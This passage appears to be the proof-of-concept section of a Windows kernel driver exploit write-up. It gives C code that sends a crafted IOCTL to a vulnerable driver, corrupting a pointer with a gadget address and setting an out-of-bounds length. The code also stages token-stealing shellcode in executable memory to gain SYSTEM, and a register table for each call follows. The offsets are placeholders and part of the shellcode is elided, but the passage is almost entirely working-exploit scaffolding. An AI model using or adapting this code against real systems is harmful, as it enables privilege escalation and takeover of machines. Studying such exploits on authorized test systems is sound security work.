## 2. PoC (C, MSVC — `cl /W4 poc.c`)

```c
#include <windows.h>
#include <stdio.h>

/* ---- TRIAGE: fill from debugger output on the authorized VM ---- */
#define TARGET_DEVICE      "\\\\.\\VulnDrv"          /* symlink from WinObj  */
#define VULN_IOCTL         0x00222003u               /* observed in IDA/dbg  */
#define OFF_CORRUPT_PTR    0x18                      /* input offset -> ptr  */
#define OFF_CORRUPT_LEN    0x20                      /* input offset -> len  */
#define TOKEN_PID_OFFSET   0x4B8                     /* EPROCESS!Token (ver) */
#define SHELLCODE_GADGET   0x1400123C4ull            /* jmp rsp gadget       */

/* Classic token-steal stub: walks EPROCESS list, copies System token.
 * Offsets are version-specific; confirm with dt nt!_EPROCESS on target. */
static const BYTE kTokenSteal[] = {
    0x65,0x48,0x8B,0x04,0x25,0x88,0x01,0x00,0x00,  /* mov rax,gs:[188h]    */
    0x48,0x8B,0x80,0xB8,0x00,0x00,0x00,            /* mov rax,[rax+0B8h]   */
    /* ... walk ActiveProcessLinks, find PID 4, copy Token+TokenPidOffset ... */
    0xC3                                             /* ret / restore + ret  */
};

int main(void)
{
    /* 1. Open a handle to the vulnerable device object. */
    HANDLE hDev = CreateFileA(TARGET_DEVICE, GENERIC_READ|GENERIC_WRITE,
                              0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) { printf("open: %lu\n", GetLastError()); return 1; }

    /* 2. Allocate and lay out the crafted input buffer. */
    BYTE in[0x100]  = {0};
    BYTE out[0x100] = {0};
    *(PVOID*)(in + OFF_CORRUPT_PTR) = (PVOID)SHELLCODE_GADGET; /* hijack target */
    *(PULONG)(in + OFF_CORRUPT_LEN) = 0xFFFFFFFF;              /* OOB length    */

    /* 3. (If RCE path) stage shellcode RWX via VirtualAlloc + memcpy. */
    LPVOID sc = VirtualAlloc(NULL, sizeof(kTokenSteal),
                             MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(sc, kTokenSteal, sizeof(kTokenSteal));

    /* 4. Trigger: single IOCTL. Watch WinDbg for the crash/breakpoint. */
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(hDev, VULN_IOCTL, in, sizeof(in),
                              out, sizeof(out), &ret, NULL);
    printf("ioctl ok=%d ret=%lu gle=%lu\n", ok, ret, GetLastError());

    /* 5. Post-exploit confirmation: token stolen -> whoami as SYSTEM. */
    system("whoami");
    CloseHandle(hDev);
    return 0;
}
```

| Step | API | Key registers at call |
|---|---|---|
| 1 | `CreateFileA` | `rcx`=`"\\\\.\\VulnDrv"`, `rdx`=`0xC0000000` |
| 2 | `VirtualAlloc` | `rcx`=0, `rdx`=stub size, `r8`=`0x3000`, `r9`=`0x40` |
| 3 | `DeviceIoControl` | `rcx`=hDev, `rdx`=VULN_IOCTL, `r8`=&in, `r9`=0x100, stack: &out, 0x100, &ret, NULL |
| — | syscall `NtDeviceIoControlFile` | `r10`=hDev, `rax`=0x07 (syscall nr, version-specific) |
| — | driver entry `DispatchDeviceControl` | `rcx`=DeviceObject, `rdx`=IRP; `Irp->AssociatedIrp.SystemBuffer` points at your 0x100-byte buffer — confirm the corrupted field offsets here |
